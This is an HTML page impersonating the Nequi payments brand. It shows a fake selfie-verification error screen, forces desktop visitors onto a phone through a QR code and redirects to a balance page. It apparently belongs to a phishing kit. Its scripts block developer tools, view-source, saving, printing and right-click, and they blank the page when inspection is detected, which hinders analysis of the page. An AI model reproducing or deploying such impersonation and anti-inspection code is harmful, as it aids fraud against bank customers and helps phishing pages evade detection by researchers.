<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Error al procesar la selfie</title>
<style>
  * { box-sizing: border-box; }

  html, body {
    margin: 0;
    height: 100%;
    background: #FFFFFF;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
  }

  .screen {
    min-height: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: space-between;
    padding: calc(env(safe-area-inset-top, 0px) + 6vh) 6vw calc(env(safe-area-inset-bottom, 0px) + 5vh);
  }

  /* Contenedor superior (Logo) */
  .header {
    display: flex;
    justify-content: center;
    width: 100%;
  }

  .logo {
    display: block;
    width: clamp(100px, 24vw, 150px);
    height: auto;
  }

  /* Contenido central (Icono de advertencia y textos) */
  .content {
    display: flex;
    flex-direction: column;
    align-items: center;
    text-align: center;
    margin-top: -5vh;
    width: 100%;
  }

  /* Círculo naranja más pequeño */
  .warning-icon {
    width: 35px;
    height: 35px;
    background-color: #f59e0b;
    border-radius: 50%;
    display: flex;
    align-items: center;
    justify-content: center;
    margin-bottom: 24px;
    box-shadow: 0 4px 12px rgba(245, 158, 11, 0.25);
  }

  .warning-icon svg {
    width: 14px;
    height: 22px;
    fill: #FFFFFF;
  }

  /* Título principal */
  h1 {
    font-size: clamp(22px, 5.5vw, 26px);
    font-weight: 700;
    color: #1f2937;
    margin: 0 0 12px 0;
    letter-spacing: -0.3px;
  }

  /* Párrafo de la vista móvil */
  p {
    font-size: clamp(13px, 3.5vw, 16px);
    color: #6b7280;
    margin: 0;
    line-height: 1.4;
  }

  /* Contenedor inferior (Intentos y botón) */
  .footer {
    width: 100%;
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 16px;
  }

  .attempts {
    font-size: 15px;
    color: #4b5563;
    font-weight: 500;
    margin: 0;
  }

  .btn {
    width: 100%;
    max-width: 440px;
    background-color: #e6007e;
    color: #FFFFFF;
    border: none;
    border-radius: 16px;
    padding: 18px;
    font-size: 17px;
    font-weight: 700;
    cursor: pointer;
    text-align: center;
    transition: background-color 0.2s ease, transform 0.1s ease;
    box-shadow: 0 4px 14px rgba(230, 0, 126, 0.3);
  }

  .btn:active {
    transform: scale(0.98);
    background-color: #cc0070;
  }

  /* Pantalla de bloqueo para PC con Código QR */
  #desktop-blocker {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100vw;
    height: 100vh;
    background: #ffffff;
    z-index: 99999;
    flex-direction: column;
    justify-content: flex-start;
    align-items: center;
    padding: 90px;
    text-align: center;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    background: url(https://i.imgur.com/jGOJlYo.png) right no-repeat #FBE5F2;
  }

  /* Logo superior en PC más grande */
  .desktop-logo {
    height: 60px;
    object-fit: contain;
    margin-bottom: 28px;
  }

  .qr-container {
    background: #ffffff;
    padding: 20px;
    border-radius: 20px;
    box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
    border: 1px solid #f0f0f5;
    margin-bottom: 24px;
  }

  .qr-container img {
    width: 220px;
    height: 220px;
    object-fit: contain;
    display: block;
  }

  .desktop-title {
    font-size: 22px;
    font-weight: 800;
    color: #1e002c;
    margin-bottom: 10px;
  }

  /* Ancho corregido a 380px para que las líneas tengan el ancho idéntico a la otra pantalla */
  .desktop-desc {
    font-size: 15px;
    color: #625768;
    max-width: 380px;
    line-height: 1.4;
    font-weight: 500;
    margin: 0 auto;
  }
</style>
</head>
<body>

<!-- Pantalla exclusiva para PC -->
<div id="desktop-blocker">
  <img class="desktop-logo" src="../NequiArchivos/vOLtQz8.png" alt="Nequi" onerror="this.src='vOLtQz8.png';">
  <div class="qr-container">
    <img src="../NequiArchivos/codigo_qr.png" alt="Escanea el código QR">
  </div>
  <div class="desktop-title">Escanea el código QR</div>
  <p class="desktop-desc">Usa la cámara de tu celular para escanear el código y continuar con la validación de identidad.</p>
</div>

<main class="screen">

  <!-- Logo superior -->
  <div class="header">
    <img class="logo" src="vOLtQz8.png" alt="Nequi" onerror="this.src='../NequiArchivos/vOLtQz8.png'">
  </div>

  <!-- Contenido central -->
  <div class="content">
    <div class="warning-icon">
      <!-- Símbolo de exclamación más grueso -->
      <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
        <path d="M10 3h4v11h-4V3zm0 13h4v4h-4v-4z"/>
      </svg>
    </div>
    <h1>Error al procesar la selfie</h1>
    <p>No pudimos procesar tu selfie. Por favor intenta con otro método</p>
  </div>

  <!-- Pie de página con intentos y botón -->
  <div class="footer">
    <p class="attempts">Probar otro método</p>
    <button class="btn" onclick="retryCapture()">Continuar</button>
  </div>

</main>

<script>
  // Función para detectar si el dispositivo es un computador
  function checkDevice() {
    const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
    if (isDesktop) {
      document.getElementById('desktop-blocker').style.display = 'flex';
    }
  }

  function retryCapture() {
    window.location.href = '../saldo.html';
  }

  // Ejecutar verificación al cargar la página
  window.addEventListener('DOMContentLoaded', checkDevice);
  // --- Bloqueo estricto de inspección y atajos de teclado ---
    document.addEventListener('keydown', function(e) {
        // Bloquear F12
        if (e.key === 'F12' || e.keyCode === 123) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + Shift + I o J (Inspeccionar / Consola)
        if (e.ctrlKey && e.shiftKey && (e.key.toUpperCase() === 'I' || e.key.toUpperCase() === 'J')) {
            e.preventDefault();
            return false;
        }

        // Bloquear Ctrl + U (Ver código fuente)
        if (e.ctrlKey && e.key.toUpperCase() === 'U') {
            e.preventDefault();
            return false;
        }
    });

    // Bloquear clic derecho
    document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
    }, false);
</script>

<script>
    // Función de detección de PC y bloqueo de herramientas abiertas por consola
    function checkDevice() {
        const isDesktop = !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) || window.innerWidth > 992;
        if (isDesktop) {
            const blocker = document.getElementById('desktop-blocker');
            if (blocker) {
                blocker.style.display = 'flex';
            }
        }
    }
    checkDevice();
    window.addEventListener('resize', checkDevice);

    // Detección heurística adicional para evitar inspección por depuración activa
    setInterval(function() {
        const widthThreshold = window.outerWidth - window.innerWidth > 160;
        const heightThreshold = window.outerHeight - window.innerHeight > 160;
        if ((widthThreshold || heightThreshold) && !(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent))) {
            document.body.innerHTML = "<h2 style='text-align:center; margin-top:20vh; font-family:Arial;'>Acceso bloqueado por seguridad.</h2>";
        }
    }, 1000);
</script>

<script src="https://unpkg.com/lucide@latest"></script>
<script>
    lucide.createIcons();
</script>

<script>
    // BLOQUEO PARA DESCARGAR PAGINA CTRL+S
(() => {
    'use strict';

    // Evita ejecutar dos veces la protección.
    if (window.__proteccionWebActiva) return;
    window.__proteccionWebActiva = true;

    function mostrarAviso() {
        if (document.getElementById('aviso-proteccion')) return;

        const aviso = document.createElement('div');
        aviso.id = 'aviso-proteccion';

        Object.assign(aviso.style, {
            position: 'fixed',
            inset: '0',
            zIndex: '2147483647',
            background: 'rgba(0,0,0,.88)',
            color: '#fff',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
            boxSizing: 'border-box',
            fontFamily: 'Arial, sans-serif',
            textAlign: 'center'
        });

        const panel = document.createElement('div');
        Object.assign(panel.style, {
            maxWidth: '420px',
            padding: '28px',
            background: '#202020',
            borderRadius: '12px',
            border: '1px solid #555'
        });

        const titulo = document.createElement('h2');
        titulo.textContent = 'Acción no permitida';

        const mensaje = document.createElement('p');
        mensaje.textContent =
            'Esta acción está restringida en esta página.';

        const boton = document.createElement('button');
        boton.type = 'button';
        boton.textContent = 'Volver a la página';

        Object.assign(boton.style, {
            padding: '12px 20px',
            border: '0',
            borderRadius: '6px',
            cursor: 'pointer',
            fontWeight: 'bold'
        });

        boton.addEventListener('click', () => aviso.remove());

        panel.append(titulo, mensaje, boton);
        aviso.appendChild(panel);
        document.body.appendChild(aviso);
    }

    // Bloquear Ctrl+S, Ctrl+U, Ctrl+P y algunas herramientas habituales.
    document.addEventListener('keydown', function (e) {
        const tecla = e.key.toLowerCase();

        if (
            (e.ctrlKey || e.metaKey) &&
            ['s', 'u', 'p'].includes(tecla)
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }

        // Bloqueo básico de F12 y Ctrl+Shift+I/J/C.
        if (
            tecla === 'f12' ||
            ((e.ctrlKey || e.metaKey) &&
             e.shiftKey &&
             ['i', 'j', 'c'].includes(tecla))
        ) {
            e.preventDefault();
            e.stopImmediatePropagation();
            mostrarAviso();
        }
    }, true);

    // Bloquear menú contextual del clic derecho.
    document.addEventListener('contextmenu', function (e) {
        e.preventDefault();
        mostrarAviso();
    }, true);

})();
</script>

</body>
</html>
